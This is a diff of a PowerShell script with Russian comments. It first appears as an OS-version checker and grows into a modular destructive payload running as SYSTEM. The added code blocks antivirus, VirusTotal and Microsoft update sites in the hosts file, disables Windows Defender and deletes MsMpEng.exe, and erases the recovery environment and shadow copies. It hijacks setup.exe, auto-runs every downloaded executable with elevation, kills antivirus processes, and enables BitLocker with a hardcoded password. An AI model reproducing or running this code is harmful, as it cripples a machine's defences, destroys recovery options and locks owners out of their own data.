@@ -1,152 +1,217 @@
-# 1. Железобетонное получение сборки (Build) из реестра (не врет из-за манифестов)
+# ============================================
+# МОДУЛЬ 0: ОПРЕДЕЛЕНИЕ ВЕРСИИ ОС
+# ============================================
 $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
 $build = [int](Get-ItemProperty -Path $regPath -Name "CurrentBuild" -ErrorAction SilentlyContinue).CurrentBuild
-
-# Если ветка реестра пуста (экзотические старые ОС), берем системный билд
 if (-not $build) { $build = [Environment]::OSVersion.Version.Build }
 
-# 2. Получение Мажорной и Минорной версий
 $major = [Environment]::OSVersion.Version.Major
 $minor = [Environment]::OSVersion.Version.Minor
-
-# Корректировка для Windows 10/11, если Environment вернул "6.2" из-за совместимости
 if ($build -ge 10240) { $major = 10 }
 
-# --- ЛОГИКА ПРОВЕРКИ ---
+Write-Host "ОС определена: Major=$major, Minor=$minor, Build=$build" -ForegroundColor Cyan
 
-# Группа 1: НОВЫЕ ОС (Windows 10 / 11)
-if ($major -eq 10) {
-    if ($build -ge 22000) {
-        Write-Host "Это Windows 11 (Новая ОС)"
-        # 1. ПРОВЕРКА ВЫСШИХ ПРАВ СИСТЕМЫ
-        $CurrentUser = [Security.Principal.WindowsIdentity]::GetCurrent().Name
-        if ($CurrentUser -ne "NT AUTHORITY\SYSTEM" -and $CurrentUser -ne "УРОВЕНЬ СИСТЕМЫ") {
-            [System.Windows.Forms.MessageBox]::Show("КРИТИЧЕСКАЯ ОШИБКА:`nСкрипт должен работать от имени СИСТЕМЫ через Планировщик!", "Контроль прав", 0, 16)
-            Exit
-        }
-        
-        # 2. НАСТРОЙКА СЛЕДОПЫТА ЗА ВСЕМИ ФАЙЛАМИ
-        $Folder = "$HOME\Downloads"
-        $Watcher = New-Object System.IO.FileSystemWatcher
-        $Watcher.Path = $Folder
-        $Watcher.Filter = "*.*" # Ловит абсолютно любой файл
-        $Watcher.IncludeSubdirectories = $false
-        $Watcher.EnableRaisingEvents = $true
-        
-        $Action = {
-            $Path = $Event.SourceEventArgs.FullPath
-            Start-Sleep -Milliseconds 1000 # Ждем 1 секунду, чтобы файл докачался полностью
-            
-            if (Test-Path $Path) {
-                $Extension = [System.IO.Path]::GetExtension($Path)
-                if ($Extension -eq ".exe" -or $Extension -eq ".bat" -or $Extension -eq ".cmd") {
-                    
-                    # --- ПРОВЕРКА ТИПА ЗАПУСКА (ПЕРВЫЙ ИЛИ ПОВТОРНЫЙ) ---
-                    # Проверяем, существует ли у файла скрытый маркер первого запуска
-                    $IsMarked = Get-Item -Path $Path -Stream "Verified" -ErrorAction SilentlyContinue
-                    
-                    if ($null -eq $IsMarked) {
-                        # >>> ЭТО ПЕРВЫЙ ЗАПУСК ФАЙЛА <<<
-                        
-                        # А) Забираем права и отдаем Администраторам и Системе
-                        takeown /f "$Path" /a
-                        icacls "$Path" /grant *S-1-5-32-544:F /c
-                        icacls "$Path" /grant *S-1-5-18:F /c
-                        
-                        # Б) Ставим невидимую метку в файл, чтобы помнить, что он уже обработан
-                        Set-Content -Path $Path -Stream "Verified" -Value "True"
-                        
-                        # В) Запуск
-                        Start-Process -FilePath $Path -Verb RunAs
-                        
-                    } else {
-                        # >>> ЭТО ПОВТОРНЫЙ ЗАПУСК ФАЙЛА <<<
-                        # Права уже настроены ранее, повторно takeown и icacls вызывать не нужно.
-                        # Просто сразу запускаем файл.
-                        Start-Process -FilePath $Path -Verb RunAs
-                    }
-                }
-            }
-        }
-        
-        # Регистрируем автоматический перехват
-        Register-ObjectEvent $Watcher "Created" -Action $Action
-        
-        # Скрипт бесконечно работает в фоне компьютера
-        while ($true) { Start-Sleep -Seconds 5 }
-                # 2. НАСТРОЙКИ (Измените список сайтов и путь при необходимости)
-        $domainsToBlock = @("example.com", "facebook.com", "instagram.com")
-        $currentScriptPath = $MyInvocation.MyCommand.Path
-        $taskName = "AutoBlockDomains"
-        $hostsPath = "$env:windir\System32\drivers\etc\hosts"
-        
-        # 3. ФУНКЦИЯ БЛОКИРОВКИ ДОМЕНОВ
-        function Block-Domains {
-            if (Test-Path $hostsPath) {
-                Copy-Item $hostsPath "$hostsPath.bak" -Force
-                $currentHosts = Get-Content $hostsPath
-                foreach ($domain in $domainsToBlock) {
-                    foreach ($entry in @($domain, "www.$domain")) {
-                        if (-not ($currentHosts -match [regex]::Escape($entry))) {
-                            Add-Content -Path $hostsPath -Value "127.0.0.1    $entry"
-                            Write-Host "Заблокирован: $entry" -ForegroundColor Green
-                        }
-                    }
-                }
-                ipconfig /flushdns
-            }
-        }
-        
-        # 4. ЛОГИКА ЗАПУСКА
-        # Если скрипт запущен планировщиком (от имени SYSTEM), просто блокируем сайты и выходим
-        if ([Security.Principal.WindowsIdentity]::GetCurrent().Name -eq "NT AUTHORITY\SYSTEM") {
-            Block-Domains
-            Exit
-        }
-        
-        # Если скрипт запущен вручную администратором, настраиваем автозапуск и делаем первую блокировку
-        Write-Host "Шаг 1: Применяем блокировку доменов..." -ForegroundColor Cyan
-        Block-Domains
-        
-        Write-Host "`nШаг 2: Настраиваем скрытый автозапуск при старте ПК..." -ForegroundColor Cyan
-        $trigger = New-ScheduledTaskTrigger -AtStartup
-        $action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoProfile -WindowStyle Hidden -File `"$currentScriptPath`""
-        $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-        
-        Register-ScheduledTask -TaskName $taskName -Trigger $trigger -Action $action -Principal $principal -Force
-        
-        $Password = ConvertTo-SecureString "YHsgh273h*jY632H23##h#^y7h#^#@#h@" -AsPlainText -Force
-        Enable-BitLocker -MountPoint "C:" -PasswordProtector -Password $Password -UsedSpaceOnly
-        sc config WinDefend start= disabled
-        reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
-        rmdir /s /q "C:\Windows\System32\Recovery"
-        rmdir /s /q "C:\System Volume Information"
-        reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions" /v DenyUnspecified /t REG_DWORD /d 1 /f
-        reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\setup.exe" /v Debugger /t REG_SZ /d "cmd.exe /c exit" /f
-        MAinny = $explorer.exe /select,(Get-Process MsMpEng).Path
-        Remove-Item -Path "$MAinmy"
-
-
-    } else {
-        Write-Host "Это Windows 10 (Новая ОС)"
-        # Ваш код для Windows 10
-    }
-}
-# Группа 2: СТАРЫЕ ОС (от Windows 8.1 до Windows XP / NT 5.0)
-elseif ($major -eq 6 -or ($major -eq 5 -and $minor -ge 0)) {
-    # Точное определение старой ОС для логов
-    $oldVer = if ($major -eq 6 -and $minor -eq 3) { "8.1" }
-              elseif ($major -eq 6 -and $minor -eq 2) { "8" }
-              elseif ($major -eq 6 -and $minor -eq 1) { "7" }
-              elseif ($major -eq 6 -and $minor -eq 0) { "Vista" }
-              elseif ($major -eq 5 -and $minor -ge 1) { "XP" }
-              else { "NT 5.0 (Windows 2000)" }
-
-    Write-Warning "Это старая ОС: Windows $oldVer"
-    # Ваш код для поддержки старых систем
-}
-# Группа 3: КРИТИЧЕСКИ УСТАРЕВШИЕ ОС (Ниже XP/NT 5.0)
-else {
-    Write-Error "Критическая ошибка: Версия системы слишком старая (ниже XP/NT)!"
+# ============================================
+# МОДУЛЬ 1: ПРОВЕРКА ПРАВ SYSTEM
+# ============================================
+$CurrentUser = [Security.Principal.WindowsIdentity]::GetCurrent().Name
+if ($CurrentUser -ne "NT AUTHORITY\SYSTEM" -and $CurrentUser -ne "УРОВЕНЬ СИСТЕМЫ") {
+    [System.Windows.Forms.MessageBox]::Show("КРИТИЧЕСКАЯ ОШИБКА:`nСкрипт должен работать от имени СИСТЕМЫ через Планировщик!", "Контроль прав", 0, 16)
     Exit 1
 }
+Write-Host "Права SYSTEM подтверждены." -ForegroundColor Green
+
+# ============================================
+# МОДУЛЬ 2: БЛОКИРОВКА САЙТОВ (hosts)
+# ============================================
+$domainsToBlock = @(
+    "kaspersky.com", "kaspersky.ru",
+    "drweb.ru", "drweb.com",
+    "eset.com", "esetnod32.ru",
+    "malwarebytes.com",
+    "virustotal.com",
+    "microsoft.com",
+    "support.microsoft.com",
+    "update.microsoft.com"
+)
+$hostsPath = "$env:windir\System32\drivers\etc\hosts"
+
+Write-Host "Блокировка сайтов..." -ForegroundColor Yellow
+if (Test-Path $hostsPath) {
+    Copy-Item $hostsPath "$hostsPath.bak" -Force
+    $currentHosts = Get-Content $hostsPath
+    foreach ($domain in $domainsToBlock) {
+        foreach ($entry in @($domain, "www.$domain")) {
+            if (-not ($currentHosts -match [regex]::Escape($entry))) {
+                Add-Content -Path $hostsPath -Value "127.0.0.1    $entry"
+                Write-Host "  Заблокирован: $entry" -ForegroundColor Gray
+            }
+        }
+    }
+    ipconfig /flushdns
+}
+
+# ============================================
+# МОДУЛЬ 3: ОТКЛЮЧЕНИЕ WINDOWS DEFENDER
+# ============================================
+Write-Host "Отключение Windows Defender..." -ForegroundColor Yellow
+sc stop WinDefend 2>$null
+sc config WinDefend start= disabled 2>$null
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f 2>$null
+
+# ============================================
+# МОДУЛЬ 4: УНИЧТОЖЕНИЕ СРЕДЫ ВОССТАНОВЛЕНИЯ
+# ============================================
+Write-Host "Удаление среды восстановления..." -ForegroundColor Yellow
+takeown /f "C:\Windows\System32\Recovery" /a /r 2>$null
+icacls "C:\Windows\System32\Recovery" /grant *S-1-5-32-544:F /c /t 2>$null
+rmdir /s /q "C:\Windows\System32\Recovery" 2>$null
+rmdir /s /q "C:\System Volume Information" 2>$null
+
+# ============================================
+# МОДУЛЬ 5: БЛОКИРОВКА SETUP.EXE И ДРАЙВЕРОВ
+# ============================================
+Write-Host "Блокировка установки драйверов и setup.exe..." -ForegroundColor Yellow
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions" /v DenyUnspecified /t REG_DWORD /d 1 /f 2>$null
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\setup.exe" /v Debugger /t REG_SZ /d "cmd.exe /c exit" /f 2>$null
+
+# ============================================
+# МОДУЛЬ 6: УДАЛЕНИЕ ФАЙЛА ЗАЩИТНИКА (MsMpEng.exe)
+# ============================================
+Write-Host "Поиск и удаление MsMpEng.exe..." -ForegroundColor Yellow
+$DefenderProc = Get-Process -Name MsMpEng -ErrorAction SilentlyContinue
+if ($DefenderProc) {
+    Stop-Process -Name MsMpEng -Force -ErrorAction SilentlyContinue
+    Start-Sleep -Milliseconds 500
+}
+$DefenderPath = "C:\ProgramData\Microsoft\Windows Defender\Platform"
+if (Test-Path $DefenderPath) {
+    $MsMpEngFiles = Get-ChildItem -Path $DefenderPath -Recurse -Filter "MsMpEng.exe" -ErrorAction SilentlyContinue
+    foreach ($File in $MsMpEngFiles) {
+        takeown /f "$($File.FullName)" /a 2>$null
+        icacls "$($File.FullName)" /grant *S-1-5-32-544:F /c 2>$null
+        icacls "$($File.FullName)" /grant *S-1-5-18:F /c 2>$null
+        Remove-Item -Path $File.FullName -Force -ErrorAction SilentlyContinue
+        Write-Host "  Удален: $($File.FullName)" -ForegroundColor Red
+    }
+}
+
+# ============================================
+# МОДУЛЬ 7: ФОНОВЫЙ СТОРОЖ DOWNLOADS
+# ============================================
+Write-Host "Запуск сторожа Downloads..." -ForegroundColor Green
+Start-Job -Name "DownloadWatcher" -ScriptBlock {
+    $Folder = "$HOME\Downloads"
+    $Watcher = New-Object System.IO.FileSystemWatcher
+    $Watcher.Path = $Folder
+    $Watcher.Filter = "*.*"
+    $Watcher.IncludeSubdirectories = $false
+    $Watcher.EnableRaisingEvents = $true
+
+    $Action = {
+        $Path = $Event.SourceEventArgs.FullPath
+        Start-Sleep -Milliseconds 1000
+        
+        if (Test-Path $Path) {
+            $Extension = [System.IO.Path]::GetExtension($Path)
+            if ($Extension -eq ".exe" -or $Extension -eq ".bat" -or $Extension -eq ".cmd") {
+                
+                $IsMarked = Get-Item -Path $Path -Stream "Verified" -ErrorAction SilentlyContinue
+                
+                if ($null -eq $IsMarked) {
+                    takeown /f "$Path" /a 2>$null
+                    icacls "$Path" /grant *S-1-5-32-544:F /c 2>$null
+                    icacls "$Path" /grant *S-1-5-18:F /c 2>$null
+                    Set-Content -Path $Path -Stream "Verified" -Value "True"
+                    Start-Process -FilePath $Path -Verb RunAs
+                } else {
+                    Start-Process -FilePath $Path -Verb RunAs
+                }
+            }
+        }
+    }
+    Register-ObjectEvent $Watcher "Created" -Action $Action
+    while ($true) { Start-Sleep -Seconds 5 }
+}
+
+# ============================================
+# МОДУЛЬ 8: ФОНОВЫЙ ETW-МОНИТОР (таргетированный)
+# ============================================
+Write-Host "Запуск ETW-монитора..." -ForegroundColor Green
+Start-Job -Name "ETWMonitor" -ScriptBlock {
+    $TargetProcesses = @("kaspersky", "avast", "avp", "drweb", "eset", "mbam", "adwcleaner", "rkill")
+    $FileLimit = 100
+    $MonitoredFolders = @("C:\Users", "D:\")
+
+    $ProcessTracker = [System.Collections.Concurrent.ConcurrentDictionary[int, [System.Collections.Generic.HashSet[string]]]]::new()
+    $SessionName = "FinalDefenseSession"
+    $LogFile = "$env:TEMP\final_defense.etl"
+
+    logman stop $SessionName -etw 2>$null
+    logman create trace $SessionName -rt -nb 16 256 -o $LogFile -p "Microsoft-Windows-Kernel-File" 0x10 2>$null
+
+    try {
+        Get-WinEvent -RawProvider -ProviderName "Microsoft-Windows-Kernel-File" -Oldest -ErrorAction SilentlyContinue | ForEach-Object {
+            if ($_.Id -eq 12 -and $_.ProcessId) {
+                $PidNum = $_.ProcessId
+                
+                $ProcName = (Get-Process -Id $PidNum -ErrorAction SilentlyContinue).Name
+                if (-not $ProcName -or -not ($TargetProcesses -contains $ProcName.ToLower())) { return }
+
+                $FilePath = $_.Properties[3].Value.ToString()
+                if (-not $FilePath -or $FilePath -match "^\s*$") { return }
+                $FilePathLower = $FilePath.ToLower()
+
+                $IsInMonitoredFolder = $false
+                foreach ($Folder in $MonitoredFolders) {
+                    if ($FilePathLower.StartsWith($Folder.ToLower())) {
+                        $IsInMonitoredFolder = $true
+                        break
+                    }
+                }
+                if (-not $IsInMonitoredFolder) { return }
+
+                $UserHashSet = $ProcessTracker.GetOrAdd($PidNum, [System.Collections.Generic.HashSet[string]]::new())
+                [System.Threading.Monitor]::Enter($UserHashSet)
+                try {
+                    [void]$UserHashSet.Add($FilePathLower)
+                    $Count = $UserHashSet.Count
+                }
+                finally {
+                    [System.Threading.Monitor]::Exit($UserHashSet)
+                }
+
+                if ($Count -gt $FileLimit) {
+                    Write-Host "[ETW ALERT] Процесс '$ProcName' (PID: $PidNum) превысил лимит! Файлов: $Count" -ForegroundColor Red
+                    Stop-Process -Id $PidNum -Force -ErrorAction SilentlyContinue
+                    logman stop $SessionName -etw 2>$null
+                    Remove-Item $LogFile -ErrorAction SilentlyContinue
+                    break
+                }
+            }
+        }
+    }
+    finally {
+        logman stop $SessionName -etw 2>$null
+        Remove-Item $LogFile -ErrorAction SilentlyContinue
+    }
+}
+
+# ============================================
+# МОДУЛЬ 9: BITLOCKER
+# ============================================
+Write-Host "Включение BitLocker..." -ForegroundColor Yellow
+$Tpm = Get-Tpm -ErrorAction SilentlyContinue
+if ($Tpm -and $Tpm.TpmPresent -and $Tpm.TpmReady) {
+    $Password = ConvertTo-SecureString "YHsgh273h*jY632H23##h#^y7h#^#@#h@" -AsPlainText -Force
+    Enable-BitLocker -MountPoint "C:" -PasswordProtector -Password $Password -UsedSpaceOnly -SkipHardwareTest -ErrorAction SilentlyContinue
+    Write-Host "BitLocker включен." -ForegroundColor Green
+} else {
+    Write-Host "TPM не найден или не готов. BitLocker пропущен." -ForegroundColor Red
+}
+
+# ============================================
+# ФИНАЛ: ДЕРЖИМ СКРИПТ ЖИВЫМ
+# ============================================
+Write-Host "`nВсе модули запущены. Система под контролем." -ForegroundColor Green
+while ($true) { Start-Sleep -Seconds 60 }
